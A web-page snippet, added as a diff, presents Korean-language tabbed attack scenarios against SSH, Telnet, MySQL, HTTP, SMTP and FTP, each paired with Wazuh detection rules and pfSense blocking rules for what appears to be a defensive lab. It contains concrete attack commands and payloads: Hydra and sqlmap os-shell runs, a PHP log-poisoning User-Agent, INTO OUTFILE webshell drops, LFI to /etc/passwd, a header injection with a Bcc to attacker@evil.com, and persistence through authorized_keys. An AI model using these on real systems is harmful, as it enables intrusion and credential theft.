@@ -1,0 +1,372 @@
+
+<h2 class="sr-only">서비스별 심화 공격 시나리오 — SSH, Telnet, DB, HTTP, Mail, FTP</h2>
+<style>
+.wrap{padding:.5rem 0 2rem;font-size:13px}
+.svc-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1.25rem}
+.svc-btn{padding:6px 14px;border:.5px solid var(--border-strong);border-radius:var(--radius);background:var(--surface-1);color:var(--text-secondary);font-size:12px;cursor:pointer;transition:all .15s;font-weight:500}
+.svc-btn.on{background:var(--text-primary);color:var(--surface-2);border-color:var(--text-primary)}
+.panel{display:none}.panel.on{display:block}
+
+.phase-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px}
+@media(max-width:540px){.phase-grid{grid-template-columns:1fr}}
+.phase-card{border:.5px solid var(--border);border-radius:12px;padding:12px 14px;background:var(--surface-1)}
+.phase-label{font-size:11px;font-weight:500;padding:2px 8px;border-radius:20px;display:inline-block;margin-bottom:8px}
+.ph-info{background:var(--bg-accent);color:var(--text-accent)}
+.ph-vuln{background:var(--bg-warning);color:var(--text-warning)}
+.ph-atk{background:var(--bg-danger);color:var(--text-danger)}
+.ph-post{background:var(--surface-1);color:var(--text-secondary);border:.5px solid var(--border-strong)}
+.phase-title{font-size:13px;font-weight:500;color:var(--text-primary);margin-bottom:6px}
+.tool-row{display:flex;align-items:flex-start;gap:6px;margin:3px 0}
+.tool-name{font-size:11px;font-weight:500;font-family:var(--font-mono);background:var(--surface-1);border:.5px solid var(--border-strong);border-radius:4px;padding:1px 6px;color:var(--text-primary);white-space:nowrap;flex-shrink:0}
+.tool-desc{font-size:12px;color:var(--text-secondary);line-height:1.5}
+
+.detect-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
+@media(max-width:480px){.detect-row{grid-template-columns:1fr}}
+.detect-box{border-radius:8px;padding:10px 12px}
+.wazuh-box{background:var(--bg-accent);border:.5px solid var(--border-accent)}
+.pf-box{background:var(--bg-danger);border:.5px solid var(--border-danger)}
+.detect-title{font-size:11px;font-weight:500;margin-bottom:6px}
+.wazuh-box .detect-title{color:var(--text-accent)}
+.pf-box .detect-title{color:var(--text-danger)}
+.detect-item{font-size:12px;color:var(--text-secondary);margin:2px 0;line-height:1.5}
+.detect-item::before{content:"·  "}
+
+.adv-box{border:.5px solid var(--border-warning);border-radius:8px;padding:10px 14px;background:var(--bg-warning);margin-top:10px}
+.adv-title{font-size:11px;font-weight:500;color:var(--text-warning);margin-bottom:6px}
+.adv-item{font-size:12px;color:var(--text-secondary);margin:3px 0;line-height:1.5}
+.adv-item::before{content:"▶  ";color:var(--text-warning)}
+</style>
+
+<div class="wrap">
+<div class="svc-tabs">
+  <button class="svc-btn on" onclick="sw('ssh',this)">SSH</button>
+  <button class="svc-btn" onclick="sw('tel',this)">Telnet</button>
+  <button class="svc-btn" onclick="sw('db',this)">DB</button>
+  <button class="svc-btn" onclick="sw('http',this)">HTTP</button>
+  <button class="svc-btn" onclick="sw('mail',this)">Mail</button>
+  <button class="svc-btn" onclick="sw('ftp',this)">FTP</button>
+</div>
+
+<!-- SSH -->
+<div id="p-ssh" class="panel on">
+  <div class="phase-grid">
+    <div class="phase-card">
+      <span class="phase-label ph-info">① 정보 수집</span>
+      <div class="phase-title">배너 · 인증 방식 수집</div>
+      <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">-sV -p22 --script ssh-auth-methods,ssh2-enum-algos 로 버전·인증 방식 열거</span></div>
+      <div class="tool-row"><span class="tool-name">nc / ssh</span><span class="tool-desc">배너 grabbing 으로 OpenSSH 버전 직접 확인</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-vuln">② 취약점 평가</span>
+      <div class="phase-title">사용자 열거 (CVE-2018-15473)</div>
+      <div class="tool-row"><span class="tool-name">ssh-user-enum</span><span class="tool-desc">OpenSSH &lt;7.7 타이밍 기반 사용자 열거 — 존재 계정은 응답 지연 차이 발생</span></div>
+      <div class="tool-row"><span class="tool-name">Metasploit</span><span class="tool-desc">auxiliary/scanner/ssh/ssh_enumusers 모듈로 자동화 열거</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-atk">③ 심화 공격</span>
+      <div class="phase-title">크리덴셜 탈취 · 키 기반 침투</div>
+      <div class="tool-row"><span class="tool-name">Hydra</span><span class="tool-desc">열거된 실사용자명으로만 좁힌 타겟 wordlist 크래킹</span></div>
+      <div class="tool-row"><span class="tool-name">ssh-keyscan</span><span class="tool-desc">공개키 수집 → 동일 키가 다른 서버에 재사용됐는지 검증</span></div>
+      <div class="tool-row"><span class="tool-name">찾은 id_rsa</span><span class="tool-desc">웹셸로 ~/.ssh/id_rsa 탈취 후 패스프레이즈 오프라인 크랙(john)</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-post">④ 침투 후 단계</span>
+      <div class="phase-title">지속성 확보 · 횡이동</div>
+      <div class="tool-row"><span class="tool-name">authorized_keys</span><span class="tool-desc">공격자 공개키 추가 → 패스워드 변경 후에도 유지되는 백도어</span></div>
+      <div class="tool-row"><span class="tool-name">ProxyJump</span><span class="tool-desc">SSH 터널로 내부망 피벗 — DB 등 내부 서비스 우회 접근</span></div>
+    </div>
+  </div>
+  <div class="adv-box">
+    <div class="adv-title">심화 포인트</div>
+    <div class="adv-item">타이밍 사이드채널: 존재 계정은 password 검증까지 진행 → 응답 ~수ms 차이로 열거 가능</div>
+    <div class="adv-item">키 재사용: 웹서버에서 탈취한 id_rsa로 DB 서버까지 무패스워드 접근 시뮬레이션</div>
+    <div class="adv-item">ssh -D 1080 (SOCKS proxy): 침투 후 내부망 전체를 공격자 프록시로 활용</div>
+  </div>
+  <div class="detect-row">
+    <div class="detect-box wazuh-box">
+      <div class="detect-title">Wazuh 탐지 포인트</div>
+      <div class="detect-item">auth.log의 Invalid user / Failed password 반복 (rule 5716, 5720)</div>
+      <div class="detect-item">짧은 시간 내 다수 계정 시도 → 브루트포스 그룹 알림</div>
+      <div class="detect-item">authorized_keys 파일 변경 → FIM 알림</div>
+      <div class="detect-item">비정상 포트포워딩 → sshd 로그 내 "Accepted publickey"</div>
+    </div>
+    <div class="detect-box pf-box">
+      <div class="detect-title">pfSense 자동 차단</div>
+      <div class="detect-item">22번 포트 연속 실패 IP → Active Response 즉시 차단</div>
+      <div class="detect-item">임계치: 60초 내 10회 실패 시 block rule 추가</div>
+      <div class="detect-item">외부→내부 SSH 허용 소스 화이트리스트 관리망 IP만 허용</div>
+    </div>
+  </div>
+</div>
+
+<!-- Telnet -->
+<div id="p-tel" class="panel">
+  <div class="phase-grid">
+    <div class="phase-card">
+      <span class="phase-label ph-info">① 정보 수집</span>
+      <div class="phase-title">배너 · OS 핑거프린팅</div>
+      <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">-sV -p23 --script telnet-ntlm-info,telnet-encryption 배너 및 NTLM 정보 수집</span></div>
+      <div class="tool-row"><span class="tool-name">nc</span><span class="tool-desc">nc [ip] 23 — 배너에서 OS · 서비스 버전 노출 확인</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-vuln">② 취약점 평가</span>
+      <div class="phase-title">평문 전송 구조 분석</div>
+      <div class="tool-row"><span class="tool-name">Wireshark</span><span class="tool-desc">23번 포트 캡처 → 로그인 과정 전체가 평문으로 노출됨을 증명</span></div>
+      <div class="tool-row"><span class="tool-name">nmap NSE</span><span class="tool-desc">telnet-brute 스크립트로 기본 자격증명 시도</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-atk">③ 심화 공격</span>
+      <div class="phase-title">ARP 스푸핑 기반 MITM 크리덴셜 탈취</div>
+      <div class="tool-row"><span class="tool-name">arpspoof</span><span class="tool-desc">arpspoof -i eth0 -t [피해자] [게이트웨이] → 트래픽 강제 경유</span></div>
+      <div class="tool-row"><span class="tool-name">ettercap</span><span class="tool-desc">-T -M arp:remote // // → 양방향 MITM + 평문 크리덴셜 자동 추출</span></div>
+      <div class="tool-row"><span class="tool-name">dsniff</span><span class="tool-desc">telnet 세션에서 입력된 패스워드 실시간 스니핑</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-post">④ 침투 후 단계</span>
+      <div class="phase-title">세션 하이재킹</div>
+      <div class="tool-row"><span class="tool-name">hunt</span><span class="tool-desc">TCP 세션 하이재킹 — 기존 인증된 telnet 세션을 가로채 명령 삽입</span></div>
+      <div class="tool-row"><span class="tool-name">탈취 크리덴셜</span><span class="tool-desc">타 서비스(SSH·FTP·DB) 동일 패스워드 재사용 공격으로 연계</span></div>
+    </div>
+  </div>
+  <div class="adv-box">
+    <div class="adv-title">심화 포인트</div>
+    <div class="adv-item">ARP Cache Poisoning: 게이트웨이·피해자 양쪽을 동시에 스푸핑해야 전이중 캡처 가능</div>
+    <div class="adv-item">세션 하이재킹: TCP 시퀀스 번호 예측 후 RST 없이 세션 탈취 — 피해자는 입력 불가 상태로 전환</div>
+    <div class="adv-item">동일 크리덴셜 연계: Telnet 패스워드로 SSH·FTP 재사용 시나리오 → 패스워드 재사용 위험 실증</div>
+  </div>
+  <div class="detect-row">
+    <div class="detect-box wazuh-box">
+      <div class="detect-title">Wazuh 탐지 포인트</div>
+      <div class="detect-item">23번 포트 연결 시도 자체를 고위험 알림 (정책상 Telnet 금지)</div>
+      <div class="detect-item">ARP 플러딩 → auditd 네트워크 이벤트 이상 감지</div>
+      <div class="detect-item">로그인 실패 반복 → Telnet auth fail 로그</div>
+    </div>
+    <div class="detect-box pf-box">
+      <div class="detect-title">pfSense 자동 차단</div>
+      <div class="detect-item">23번 포트 인바운드 기본 BLOCK (정책 룰)</div>
+      <div class="detect-item">ARP 이상 감지 시 해당 MAC/IP 격리</div>
+      <div class="detect-item">내부망 내 비정상 ARP broadcast 임계치 초과 시 차단</div>
+    </div>
+  </div>
+</div>
+
+<!-- DB -->
+<div id="p-db" class="panel">
+  <div class="phase-grid">
+    <div class="phase-card">
+      <span class="phase-label ph-info">① 정보 수집</span>
+      <div class="phase-title">DB 버전 · 계정 · 구조 열거</div>
+      <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">--script mysql-info,mysql-databases,mysql-users -p3306</span></div>
+      <div class="tool-row"><span class="tool-name">Metasploit</span><span class="tool-desc">auxiliary/scanner/mysql/mysql_version, mysql_login으로 버전 및 익명 접속 여부 확인</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-vuln">② 취약점 평가</span>
+      <div class="phase-title">외부 노출 · 약한 크리덴셜</div>
+      <div class="tool-row"><span class="tool-name">Hydra</span><span class="tool-desc">root/admin/mysql 계정 대상 패스워드 브루트포스</span></div>
+      <div class="tool-row"><span class="tool-name">mysql CLI</span><span class="tool-desc">패스워드 없는 root 접속 시도, information_schema 전체 덤프</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-atk">③ 심화 공격</span>
+      <div class="phase-title">UDF 기반 OS 명령 실행</div>
+      <div class="tool-row"><span class="tool-name">UDF exploit</span><span class="tool-desc">MySQL plugin_dir에 악성 .so 업로드 → CREATE FUNCTION sys_exec으로 OS 명령 실행</span></div>
+      <div class="tool-row"><span class="tool-name">INTO OUTFILE</span><span class="tool-desc">SELECT "shell code" INTO OUTFILE '/var/www/html/shell.php' → 웹셸 드롭</span></div>
+      <div class="tool-row"><span class="tool-name">sqlmap</span><span class="tool-desc">--os-shell --technique=BEUSTQ 로 블라인드 인젝션 → OS 쉘 자동화</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-post">④ 침투 후 단계</span>
+      <div class="phase-title">크리덴셜 덤프 · 권한 상승</div>
+      <div class="tool-row"><span class="tool-name">mysqldump</span><span class="tool-desc">전체 DB 덤프 → 저장된 해시(md5/sha1) 오프라인 크랙</span></div>
+      <div class="tool-row"><span class="tool-name">mysql.user</span><span class="tool-desc">password 컬럼 해시값 추출 → hashcat/john으로 원문 복구</span></div>
+    </div>
+  </div>
+  <div class="adv-box">
+    <div class="adv-title">심화 포인트</div>
+    <div class="adv-item">UDF RCE: lib_mysqludf_sys.so 업로드 → sys_exec('id') 로 DB프로세스 권한으로 명령 실행 (보통 mysql 유저)</div>
+    <div class="adv-item">LOAD DATA INFILE: /etc/passwd, /etc/shadow 파일 읽기 → 시스템 계정 정보 수집</div>
+    <div class="adv-item">체인 공격: SQLi → INTO OUTFILE 웹셸 → ROP 익스플로잇 → root 탈취 전체 파이프라인 시뮬레이션</div>
+  </div>
+  <div class="detect-row">
+    <div class="detect-box wazuh-box">
+      <div class="detect-title">Wazuh 탐지 포인트</div>
+      <div class="detect-item">mysql error log: Access denied 반복, unknown command</div>
+      <div class="detect-item">auditd: mysql 프로세스의 비정상 execve (UDF 실행)</div>
+      <div class="detect-item">FIM: plugin_dir 내 신규 .so 파일 생성 감지</div>
+      <div class="detect-item">웹서버 로그: shell.php 생성 후 접근 패턴</div>
+    </div>
+    <div class="detect-box pf-box">
+      <div class="detect-title">pfSense 자동 차단</div>
+      <div class="detect-item">3306 포트 외부 접근 기본 BLOCK</div>
+      <div class="detect-item">내부망 → DMZ 방향 DB 쿼리 임계치 초과 시 차단</div>
+      <div class="detect-item">Wazuh UDF 탐지 → 해당 내부 IP 즉시 격리</div>
+    </div>
+  </div>
+</div>
+
+<!-- HTTP -->
+<div id="p-http" class="panel">
+  <div class="phase-grid">
+    <div class="phase-card">
+      <span class="phase-label ph-info">① 정보 수집</span>
+      <div class="phase-title">구조 · 기술스택 · 디렉터리 열거</div>
+      <div class="tool-row"><span class="tool-name">nikto</span><span class="tool-desc">웹서버 설정 오류, 노출된 파일, 구버전 컴포넌트 자동 점검</span></div>
+      <div class="tool-row"><span class="tool-name">gobuster</span><span class="tool-desc">dir -w /usr/share/wordlists/dirbuster/big.txt 숨겨진 경로 발굴</span></div>
+      <div class="tool-row"><span class="tool-name">whatweb</span><span class="tool-desc">CMS · 프레임워크 · 버전 핑거프린팅</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-vuln">② 취약점 평가</span>
+      <div class="phase-title">파일 포함 · 업로드 취약점</div>
+      <div class="tool-row"><span class="tool-name">Burp Suite</span><span class="tool-desc">파일 업로드 MIME/확장자 우회 테스트, LFI 파라미터 퍼징</span></div>
+      <div class="tool-row"><span class="tool-name">LFI scan</span><span class="tool-desc">../etc/passwd, php://filter/convert.base64-encode/resource=index.php 소스 노출</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-atk">③ 심화 공격</span>
+      <div class="phase-title">LFI→로그 포이즈닝 RCE · 웹셸 업로드</div>
+      <div class="tool-row"><span class="tool-name">Log Poisoning</span><span class="tool-desc">User-Agent에 PHP 코드 삽입 → LFI로 /var/log/apache2/access.log 인클루드 → RCE</span></div>
+      <div class="tool-row"><span class="tool-name">Upload bypass</span><span class="tool-desc">shell.php.jpg (이중확장자), Content-Type: image/jpeg 변조, null byte %00 우회</span></div>
+      <div class="tool-row"><span class="tool-name">SSRF</span><span class="tool-desc">url= 파라미터로 내부 서비스(DB 관리, 메타데이터) 접근 시도</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-post">④ 침투 후 단계</span>
+      <div class="phase-title">웹셸 → 리버스셸 → 권한 상승</div>
+      <div class="tool-row"><span class="tool-name">weevely</span><span class="tool-desc">탐지 우회형 PHP 웹셸 생성 · 관리 (난독화 + TLS 지원)</span></div>
+      <div class="tool-row"><span class="tool-name">ROP chain</span><span class="tool-desc">www-data → SUID 바이너리 ROP → root 탈취 (기존 검증 완료 파이프라인 연계)</span></div>
+    </div>
+  </div>
+  <div class="adv-box">
+    <div class="adv-title">심화 포인트</div>
+    <div class="adv-item">Log Poisoning 체인: curl -H "User-Agent: &lt;?php system($_GET['c']);?&gt;" http://target → LFI로 로그파일 실행</div>
+    <div class="adv-item">XXE: XML 파서 있는 엔드포인트에 ENTITY 선언으로 /etc/shadow 파일 외부 전송</div>
+    <div class="adv-item">PHP Deserialization: unserialize() 사용 경로 발견 시 POP chain으로 RCE 트리거</div>
+  </div>
+  <div class="detect-row">
+    <div class="detect-box wazuh-box">
+      <div class="detect-title">Wazuh 탐지 포인트</div>
+      <div class="detect-item">access.log: ../../../ 경로 포함 GET 요청 (rule 31151)</div>
+      <div class="detect-item">웹셸 접근: POST → 200 응답 + 짧은 응답시간 이상 패턴</div>
+      <div class="detect-item">FIM: webroot 디렉터리 내 신규 .php 파일 생성</div>
+      <div class="detect-item">auditd: www-data의 execve(/bin/sh) 탐지</div>
+    </div>
+    <div class="detect-box pf-box">
+      <div class="detect-title">pfSense 자동 차단</div>
+      <div class="detect-item">단시간 다수 404 응답 소스 IP → 디렉터리 스캔 탐지 차단</div>
+      <div class="detect-item">웹셸 탐지 Wazuh 이벤트 → 소스 IP 방화벽 즉시 등록</div>
+      <div class="detect-item">내부→외부 리버스셸 아웃바운드 포트 제한</div>
+    </div>
+  </div>
+</div>
+
+<!-- Mail -->
+<div id="p-mail" class="panel">
+  <div class="phase-grid">
+    <div class="phase-card">
+      <span class="phase-label ph-info">① 정보 수집</span>
+      <div class="phase-title">SMTP 배너 · 사용자 열거</div>
+      <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">--script smtp-commands,smtp-enum-users -p25,465,587</span></div>
+      <div class="tool-row"><span class="tool-name">VRFY/EXPN</span><span class="tool-desc">SMTP VRFY admin → 계정 존재 여부 응답 코드로 사용자 열거</span></div>
+      <div class="tool-row"><span class="tool-name">smtp-user-enum</span><span class="tool-desc">-M VRFY -U /usr/share/wordlists/names.txt -t [target] 자동화 열거</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-vuln">② 취약점 평가</span>
+      <div class="phase-title">오픈 릴레이 · 인증 취약점</div>
+      <div class="tool-row"><span class="tool-name">swaks</span><span class="tool-desc">--to victim@external.com --from fake@internal.com --server [target] → 오픈 릴레이 여부 확인</span></div>
+      <div class="tool-row"><span class="tool-name">Hydra</span><span class="tool-desc">-L users.txt -P pass.txt smtp://[target] SMTP AUTH 크래킹</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-atk">③ 심화 공격</span>
+      <div class="phase-title">헤더 인젝션 · STARTTLS 다운그레이드</div>
+      <div class="tool-row"><span class="tool-name">헤더 인젝션</span><span class="tool-desc">Subject: test\r\nBcc: attacker@evil.com → 숨겨진 수신자 추가, 피싱 메일 발송</span></div>
+      <div class="tool-row"><span class="tool-name">STARTTLS strip</span><span class="tool-desc">MITM으로 STARTTLS 응답 제거 → 평문 세션 강제 유도 후 크리덴셜 캡처</span></div>
+      <div class="tool-row"><span class="tool-name">Metasploit</span><span class="tool-desc">auxiliary/scanner/smtp/smtp_relay 오픈 릴레이 자동 검증</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-post">④ 침투 후 단계</span>
+      <div class="phase-title">인증 후 침투 확장</div>
+      <div class="tool-row"><span class="tool-name">POP3/IMAP</span><span class="tool-desc">탈취 크리덴셜로 메일함 전체 열람 → 내부 정보·타 크리덴셜 수집</span></div>
+      <div class="tool-row"><span class="tool-name">피싱 연계</span><span class="tool-desc">내부 계정으로 신뢰도 높은 피싱 메일 발송 → 다른 사용자 계정 탈취</span></div>
+    </div>
+  </div>
+  <div class="adv-box">
+    <div class="adv-title">심화 포인트</div>
+    <div class="adv-item">VRFY 열거 → 탈취한 실계정으로 피싱 발신 → 수신자 클릭 → 웹셸 경유 → 내부망 완전 장악 시나리오</div>
+    <div class="adv-item">Postfix misconfiguration: mynetworks에 내부 대역 전체 포함 시 인증 없이 임의 발신 가능</div>
+    <div class="adv-item">메일 본문 내 악성 첨부(msfvenom payload) 발송 → 사용자 실행 유도 → 리버스셸</div>
+  </div>
+  <div class="detect-row">
+    <div class="detect-box wazuh-box">
+      <div class="detect-title">Wazuh 탐지 포인트</div>
+      <div class="detect-item">mail.log: VRFY/EXPN 명령 반복 → 사용자 열거 탐지</div>
+      <div class="detect-item">인증 실패 반복 → rule 그룹 smtp_brute</div>
+      <div class="detect-item">오픈 릴레이 발송 → "relay denied" 급증</div>
+      <div class="detect-item">비정상 헤더 패턴 → 커스텀 룰 설정 필요</div>
+    </div>
+    <div class="detect-box pf-box">
+      <div class="detect-title">pfSense 자동 차단</div>
+      <div class="detect-item">25번 포트 외부 직접 접근 BLOCK (587/465만 허용)</div>
+      <div class="detect-item">SMTP AUTH 실패 임계치 초과 IP 차단</div>
+      <div class="detect-item">내부→외부 대량 메일 발송 트래픽 쉐이핑</div>
+    </div>
+  </div>
+</div>
+
+<!-- FTP -->
+<div id="p-ftp" class="panel">
+  <div class="phase-grid">
+    <div class="phase-card">
+      <span class="phase-label ph-info">① 정보 수집</span>
+      <div class="phase-title">버전 · 익명 접속 · 디렉터리 열거</div>
+      <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">--script ftp-anon,ftp-syst,ftp-bounce -p21 버전 및 익명 로그인 가능 여부 확인</span></div>
+      <div class="tool-row"><span class="tool-name">ftp</span><span class="tool-desc">anonymous / anonymous@domain 익명 접속 시도 → 디렉터리 탐색</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-vuln">② 취약점 평가</span>
+      <div class="phase-title">버전별 CVE · 설정 오류</div>
+      <div class="tool-row"><span class="tool-name">vsftpd 2.3.4</span><span class="tool-desc">CVE-2011-2523 — 스마일리 백도어: 유저명에 :) 포함 시 6200번 포트에 루트 셸 오픈</span></div>
+      <div class="tool-row"><span class="tool-name">ProFTPd</span><span class="tool-desc">mod_copy 모듈: SITE CPFR/CPTO 명령으로 서버 내 파일 임의 복사 (웹루트로 이동)</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-atk">③ 심화 공격</span>
+      <div class="phase-title">바운스 어택 · 웹셸 드롭</div>
+      <div class="tool-row"><span class="tool-name">FTP Bounce</span><span class="tool-desc">PORT 명령으로 제3의 호스트 포트 스캔 — 방화벽 우회 내부 스캐닝</span></div>
+      <div class="tool-row"><span class="tool-name">mod_copy RCE</span><span class="tool-desc">SITE CPFR /proc/self/cmdline → CPTO /var/www/html/info.php → 웹셸 직접 드롭</span></div>
+      <div class="tool-row"><span class="tool-name">Hydra</span><span class="tool-desc">-L users.txt -P pass.txt ftp://[target] 크리덴셜 브루트포스</span></div>
+    </div>
+    <div class="phase-card">
+      <span class="phase-label ph-post">④ 침투 후 단계</span>
+      <div class="phase-title">파일 탈취 · 웹 연계</div>
+      <div class="tool-row"><span class="tool-name">wget -r</span><span class="tool-desc">접근 가능한 디렉터리 전체 미러링 → 소스코드·설정파일 수집</span></div>
+      <div class="tool-row"><span class="tool-name">설정파일</span><span class="tool-desc">config.php, .env, db.conf 등 크리덴셜 포함 파일 탈취 → DB·SSH 연계</span></div>
+    </div>
+  </div>
+  <div class="adv-box">
+    <div class="adv-title">심화 포인트</div>
+    <div class="adv-item">vsftpd 2.3.4 백도어: Metasploit exploit/unix/ftp/vsftpd_234_backdoor 로 즉시 root 셸 획득</div>
+    <div class="adv-item">FTP Bounce 내부 스캔: 외부에서 방화벽 뒤 내부 DB(3306), Redis(6379) 포트 스캔 우회 가능</div>
+    <div class="adv-item">익명 쓰기 권한: 웹루트와 공유된 FTP 디렉터리에 웹셸 업로드 → HTTP로 실행하는 체인</div>
+  </div>
+  <div class="detect-row">
+    <div class="detect-box wazuh-box">
+      <div class="detect-title">Wazuh 탐지 포인트</div>
+      <div class="detect-item">vsftpd.log: 530 Login incorrect 반복, :) 유저명 시도</div>
+      <div class="detect-item">6200번 포트 오픈 감지 → 백도어 트리거 탐지</div>
+      <div class="detect-item">FIM: 웹루트에 FTP 경로 통해 .php 파일 생성</div>
+      <div class="detect-item">SITE CPFR/CPTO 명령 로그 → 커스텀 룰 탐지</div>
+    </div>
+    <div class="detect-box pf-box">
+      <div class="detect-title">pfSense 자동 차단</div>
+      <div class="detect-item">21번 포트 외부 접근 제한 (관리망 IP만 허용)</div>
+      <div class="detect-item">6200번 포트 아웃바운드 BLOCK (백도어 셸 차단)</div>
+      <div class="detect-item">FTP 브루트포스 임계치 초과 IP 자동 차단</div>
+      <div class="detect-item">PASV 모드 데이터 포트 범위 명시적 제한</div>
+    </div>
+  </div>
+</div>
+</div>
+
+<script>
+function sw(id,btn){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.svc-btn').forEach(b=>b.classList.remove('on'));
+  document.getElementById('p-'+id).classList.add('on');
+  btn.classList.add('on');
+}
+</script>
